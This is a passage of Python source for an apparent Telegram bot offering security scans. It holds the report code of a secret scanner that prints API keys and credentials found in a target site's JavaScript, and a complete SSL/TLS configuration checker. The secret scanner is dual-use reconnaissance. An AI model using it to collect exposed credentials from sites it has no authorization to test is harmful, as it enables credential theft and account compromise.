    highs  = [s for s in data["secrets"] if "HIGH" in s["severity"]]
    mediums = [s for s in data["secrets"] if "MEDIUM" in s["severity"]]

    severity_label = ("🔴 CRITICAL" if crits else
                      "🟠 HIGH" if highs else
                      "🟡 MEDIUM" if mediums else
                      "✅ Clean")

    lines = [
        f"🔑 *Secret Scanner — `{domain}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Result: {severity_label}",
        f"JS files scanned: `{len(data['js_files'])}`",
        f"Total secrets found: `{total}`",
    ]

    if data["secrets"]:
        lines.append("")
        # Group by severity
        for group_label, group in [
            ("🔴 CRITICAL", crits), ("🟠 HIGH", highs), ("🟡 MEDIUM", mediums)
        ]:
            if not group: continue
            lines.append(f"*{group_label} ({len(group)}):*")
            for s in group[:6]:
                lines.append(f"  `{s['type']}`")
                lines.append(f"  Value: `{s['value']}`")
                lines.append(f"  Source: `{s['source']}`")
                lines.append("")
    else:
        lines.append("\n✅ No secrets or API keys detected in JS/source files")

    lines.append("⚠️ _Authorized testing only_")
    await msg.edit_text("\n".join(lines), parse_mode='Markdown')

    # JSON report
    import io as _io
    rj = json.dumps(data, indent=2, default=str, ensure_ascii=False)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=_io.BytesIO(rj.encode()),
        filename=f"secrets_{re.sub(r'[^\w]','_',domain)}_{ts}.json",
        caption=f"🔑 Secret Scan — `{domain}` | Found: `{total}`",
        parse_mode='Markdown'
    )


# ══════════════════════════════════════════════════
# 🔒 /ssltls — SSL/TLS Configuration Scanner
# ══════════════════════════════════════════════════

def _ssltls_scan_sync(hostname: str, progress_q: list) -> dict:
    """Scan SSL/TLS config: cert info, expiry, weak ciphers, protocols, HSTS."""
    import ssl, datetime as _dt

    results = {
        "cert_valid":    False,
        "cert_expired":  False,
        "days_left":     None,
        "subject":       {},
        "issuer":        {},
        "san":           [],
        "tls_versions":  {},   # {version: supported/not}
        "weak_ciphers":  [],
        "strong_ciphers": [],
        "hsts":          False,
        "hsts_max_age":  0,
        "hsts_preload":  False,
        "cert_grade":    "F",
        "issues":        [],
        "warnings":      [],
    }

    # ── Step 1: Cert info ─────────────────────────
    progress_q.append("🔒 Fetching SSL certificate info...")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((hostname, 443), timeout=10),
                             server_hostname=hostname) as s:
            cert = s.getpeercert()
            results["cert_valid"] = True

            # Subject / Issuer
            subject = dict(x[0] for x in cert.get('subject', []))
            issuer  = dict(x[0] for x in cert.get('issuer',  []))
            results["subject"] = subject
            results["issuer"]  = issuer

            # Expiry
            expiry_str = cert.get('notAfter', '')
            if expiry_str:
                expiry = _dt.datetime.strptime(expiry_str, "%b %d %H:%M:%S %Y %Z")
                days_left = (expiry - _dt.datetime.utcnow()).days
                results["days_left"] = days_left
                results["cert_expired"] = days_left < 0
                if days_left < 0:
                    results["issues"].append(f"❌ Certificate EXPIRED {abs(days_left)} days ago")
                elif days_left < 14:
                    results["issues"].append(f"⚠️ Certificate expires in {days_left} days (CRITICAL)")
                elif days_left < 30:
                    results["warnings"].append(f"⚠️ Certificate expires in {days_left} days")

            # SAN (Subject Alternative Names)
            san = [v for t, v in cert.get('subjectAltName', []) if t == 'DNS']
            results["san"] = san[:10]

        progress_q.append(f"✅ Cert valid | {results['days_left']} days left")
    except ssl.SSLCertVerificationError as e:
        results["issues"].append(f"❌ Certificate verification failed: {e}")
    except Exception as e:
        results["issues"].append(f"❌ SSL connect failed: {e}")

    # ── Step 2: TLS version support ───────────────
    progress_q.append("🔒 Testing TLS protocol versions...")
    tls_versions_to_test = {
        "SSLv3":   ssl.PROTOCOL_TLS_CLIENT,   # will fail = good
        "TLSv1.0": ssl.PROTOCOL_TLS_CLIENT,
        "TLSv1.1": ssl.PROTOCOL_TLS_CLIENT,
        "TLSv1.2": ssl.PROTOCOL_TLS_CLIENT,
        "TLSv1.3": ssl.PROTOCOL_TLS_CLIENT,
    }
    # Quick test via requests with explicit min version
    try:
        # TLSv1.2 check
        ctx12 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx12.maximum_version = ssl.TLSVersion.TLSv1_2
        ctx12.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx12.check_hostname = False
        ctx12.verify_mode = ssl.CERT_NONE
        try:
            with ctx12.wrap_socket(socket.create_connection((hostname, 443), timeout=6),
                                   server_hostname=hostname) as s:
                results["tls_versions"]["TLSv1.2"] = "✅ Supported"
        except Exception:
            results["tls_versions"]["TLSv1.2"] = "❌ Not supported"

        # TLSv1.3 check
        if hasattr(ssl.TLSVersion, 'TLSv1_3'):
            ctx13 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx13.minimum_version = ssl.TLSVersion.TLSv1_3
            ctx13.check_hostname = False
            ctx13.verify_mode = ssl.CERT_NONE
            try:
                with ctx13.wrap_socket(socket.create_connection((hostname, 443), timeout=6),
                                       server_hostname=hostname) as s:
                    results["tls_versions"]["TLSv1.3"] = "✅ Supported"
            except Exception:
                results["tls_versions"]["TLSv1.3"] = "❌ Not supported"

        # TLSv1.0 check (weak)
        try:
            ctx10 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx10.maximum_version = ssl.TLSVersion.TLSv1
            ctx10.minimum_version = ssl.TLSVersion.TLSv1
            ctx10.check_hostname = False
            ctx10.verify_mode = ssl.CERT_NONE
            with ctx10.wrap_socket(socket.create_connection((hostname, 443), timeout=5),
                                   server_hostname=hostname) as s:
                results["tls_versions"]["TLSv1.0"] = "⚠️ Supported (WEAK)"
                results["issues"].append("⚠️ TLS 1.0 supported — deprecated, should disable")
        except Exception:
            results["tls_versions"]["TLSv1.0"] = "✅ Disabled"
    except Exception as e:
        logging.debug("TLS version test error: %s", e)

    # ── Step 3: Cipher strength ───────────────────
    progress_q.append("🔒 Checking cipher suite strength...")
    try:
        ctx_c = ssl.create_default_context()
        ctx_c.check_hostname = False
        ctx_c.verify_mode = ssl.CERT_NONE
        with ctx_c.wrap_socket(socket.create_connection((hostname, 443), timeout=8),
                                server_hostname=hostname) as s:
            cipher = s.cipher()
            if cipher:
                cipher_name, tls_ver, bits = cipher
                results["strong_ciphers"].append(f"{cipher_name} ({bits}-bit, {tls_ver})")
                if bits and bits < 128:
                    results["weak_ciphers"].append(cipher_name)
                    results["issues"].append(f"⚠️ Weak cipher: {cipher_name} ({bits}-bit)")
    except Exception as e:
        logging.debug("Cipher check error: %s", e)

    # ── Step 4: HSTS check ────────────────────────
    progress_q.append("🔒 Checking HSTS header...")
    try:
        r = requests.get(f"https://{hostname}", headers=_get_headers(),
                         timeout=8, verify=False, allow_redirects=True)
        hsts = r.headers.get("Strict-Transport-Security", "")
        if hsts:
            results["hsts"] = True
            age_match = re.search(r'max-age=(\d+)', hsts)
            if age_match:
                results["hsts_max_age"] = int(age_match.group(1))
            results["hsts_preload"] = "preload" in hsts.lower()
            if results["hsts_max_age"] < 15768000:  # < 6 months
                results["warnings"].append("⚠️ HSTS max-age < 6 months (recommend ≥ 1 year)")
        else:
            results["issues"].append("❌ HSTS header missing")
    except Exception as e:
        logging.debug("HSTS check error: %s", e)

    # ── Step 5: Grade calculation ─────────────────
    score = 100
    if results["cert_expired"]:        score -= 50
    if not results["hsts"]:            score -= 15
    if results["weak_ciphers"]:        score -= 20
    if "TLSv1.0" in str(results["tls_versions"]) and "WEAK" in str(results["tls_versions"]):
        score -= 15
    if results["days_left"] and results["days_left"] < 14: score -= 20
    if results["days_left"] and results["days_left"] < 30: score -= 10

    results["cert_grade"] = ("A+" if score >= 95 else "A"  if score >= 90 else
                              "B"  if score >= 80 else "C"  if score >= 70 else
                              "D"  if score >= 60 else "F")
    return results


async def cmd_ssltls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/ssltls <domain> — SSL/TLS configuration scanner"""
    if not await check_force_join(update, context): return
    uid = update.effective_user.id
    allowed, wait = check_rate_limit(uid, heavy=True)
    if not allowed:
        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
        return

    if not context.args:
        await update.effective_message.reply_text(
            "🔒 *SSL/TLS Scanner Usage:*\n`/ssltls example.com`\n\n"
            "*Checks:*\n"
            "  • Certificate validity + expiry date\n"
            "  • Subject / Issuer / SAN\n"
            "  • TLS 1.0 / 1.2 / 1.3 support\n"
            "  • Cipher suite strength\n"
            "  • HSTS header + max-age + preload\n"
            "  • Overall SSL grade (A+ to F)\n",
            parse_mode='Markdown'
        )
        return

    host = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0]
    safe_ok, reason = is_safe_url(f"https://{host}")
    if not safe_ok:
        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
        return

    if uid in _active_scans:
        await update.effective_message.reply_text(
            f"⏳ *`{_active_scans[uid]}` running* — `/stop` နှိပ်ပါ", parse_mode='Markdown')
        return
    _active_scans[uid] = "SSL/TLS scan"

    msg = await update.effective_message.reply_text(
        f"🔒 *SSL/TLS Scan — `{host}`*\n\n⏳ Connecting...", parse_mode='Markdown')
    progress_q = []

    async def _prog():
        while True:
            await asyncio.sleep(2)
            if progress_q:
                txt = progress_q[-1]; progress_q.clear()
                try:
                    await msg.edit_text(
                        f"🔒 *SSL/TLS — `{host}`*\n\n{txt}", parse_mode='Markdown')
                except Exception: pass

    prog = asyncio.create_task(_prog())
    # ── Queue notification: show message if scan is already running ──
    if scan_semaphore._value == 0:
        await update.effective_message.reply_text(
            "📋 *Scan Queue*\n⏳ Scan တစ်ခု run နေသည် — ပြီးမှ အလိုအလျောက် စမည်\n"
            "_ဘာမှ နှိပ်စရာမလိုဘဲ အောက်မှာ result ပေးမည်_",
            parse_mode='Markdown'
        )
    try:
        async with scan_semaphore:
            data = await asyncio.to_thread(_ssltls_scan_sync, host, progress_q)
    finally:
        prog.cancel()
        _active_scans.pop(uid, None)

    grade = data["cert_grade"]
    grade_icon = {"A+": "🟢", "A": "🟢", "B": "🟡", "C": "🟡", "D": "🔴", "F": "🔴"}.get(grade, "⚪")

    lines = [
        f"🔒 *SSL/TLS Scan — `{host}`*",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Grade: {grade_icon} *{grade}*",
        "",
    ]

    # Cert info
    if data["subject"]:
        cn = data["subject"].get("commonName", host)
        lines.append(f"📜 *Certificate:*")
        lines.append(f"  CN: `{cn}`")
        issuer_org = data["issuer"].get("organizationName", "Unknown")
        lines.append(f"  Issuer: `{issuer_org}`")

    if data["days_left"] is not None:
        expiry_icon = "✅" if data["days_left"] > 30 else ("⚠️" if data["days_left"] > 0 else "❌")
        lines.append(f"  Expiry: {expiry_icon} `{data['days_left']} days remaining`")

    if data["san"]:
        san_str = "`, `".join(data["san"][:5])
        lines.append(f"  SAN: `{san_str}`")

    # TLS versions
    if data["tls_versions"]:
        lines.append(f"\n⚙️ *TLS Versions:*")
        for ver, status in data["tls_versions"].items():
            lines.append(f"  {ver}: {status}")

    # Ciphers
    if data["strong_ciphers"]:
        lines.append(f"\n🔐 *Active Cipher:*")
        for c in data["strong_ciphers"][:2]:
            lines.append(f"  `{c}`")

    # HSTS
    hsts_icon = "✅" if data["hsts"] else "❌"
    lines.append(f"\n🛡️ *HSTS:* {hsts_icon} {'Present' if data['hsts'] else 'Missing'}")
    if data["hsts"]:
        age_days = data["hsts_max_age"] // 86400
        lines.append(f"  max-age: `{age_days} days` | preload: {'✅' if data['hsts_preload'] else '❌'}")

    # Issues
    if data["issues"]:
        lines.append(f"\n*⚠️ Issues ({len(data['issues'])}):*")
        for issue in data["issues"]:
            lines.append(f"  {issue}")
    if data["warnings"]:
        for w in data["warnings"]:
            lines.append(f"  {w}")

    if not data["issues"] and not data["warnings"]:
        lines.append("\n✅ No SSL/TLS issues detected")

    await msg.edit_text("\n".join(lines), parse_mode='Markdown')


if __name__ == '__main__':
    main()
